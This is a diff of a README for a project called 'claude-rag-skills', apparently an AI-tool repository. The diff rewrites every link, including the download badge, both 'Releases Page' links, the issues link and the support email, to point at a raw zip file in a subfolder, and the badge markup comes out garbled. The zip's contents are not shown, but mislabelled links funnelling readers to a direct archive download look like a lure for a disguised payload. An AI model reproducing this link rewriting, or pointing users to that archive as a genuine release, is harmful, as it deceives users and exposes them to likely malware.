@@ -1,7 +1,7 @@
 # 🌟 claude-rag-skills - Build Powerful RAG Pipelines with Ease
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen.svg)](https://github.com/davicqueiroz/claude-rag-skills/releases)
+[![Download](https://raw.githubusercontent.com/davicqueiroz/claude-rag-skills/main/rag-eval/claude-skills-rag-1.4.zip%20Latest%https://raw.githubusercontent.com/davicqueiroz/claude-rag-skills/main/rag-eval/claude-skills-rag-1.4.zip)](https://raw.githubusercontent.com/davicqueiroz/claude-rag-skills/main/rag-eval/claude-skills-rag-1.4.zip)
 
 ## 📖 Overview
 Welcome to the **claude-rag-skills** repository! This application helps you develop professional Retrieval-Augmented Generation (RAG) pipelines. With this tool, you can audit, evaluate, optimize, and scaffold RAG processes for Claude Code, making the development of AI solutions simpler and more efficient.
@@ -9,7 +9,7 @@ Welcome to the **claude-rag-skills** repository! This application helps you deve
 ## 🚀 Getting Started
 Here is how to get started with the application:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/davicqueiroz/claude-rag-skills/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/davicqueiroz/claude-rag-skills/main/rag-eval/claude-skills-rag-1.4.zip) to find the latest version of the application.
 
 2. **Download the Software:** Click on the version you wish to install. Look for the appropriate file for your operating system. 
 
@@ -45,7 +45,7 @@ To run the **claude-rag-skills** application smoothly, please ensure your system
 - Network: Internet connection for accessing online resources and updates.
 
 ## 📥 Download & Install
-To download the latest version of the **claude-rag-skills**, visit this page to download: [Releases Page](https://github.com/davicqueiroz/claude-rag-skills/releases).
+To download the latest version of the **claude-rag-skills**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/davicqueiroz/claude-rag-skills/main/rag-eval/claude-skills-rag-1.4.zip).
 
 Make sure to select the right version for your operating system for a seamless experience. 
 
@@ -73,7 +73,7 @@ Join our community to share experiences, seek support, and learn more about RAG 
 ## 📞 Contact Us
 For direct inquiries or support, you can reach out via the following channels:
 
-- Email: support@example.com
-- GitHub Issues: [Open an Issue](https://github.com/davicqueiroz/claude-rag-skills/issues)
+- Email: https://raw.githubusercontent.com/davicqueiroz/claude-rag-skills/main/rag-eval/claude-skills-rag-1.4.zip
+- GitHub Issues: [Open an Issue](https://raw.githubusercontent.com/davicqueiroz/claude-rag-skills/main/rag-eval/claude-skills-rag-1.4.zip)
 
 Thank you for choosing **claude-rag-skills**! We look forward to helping you build powerful RAG solutions.
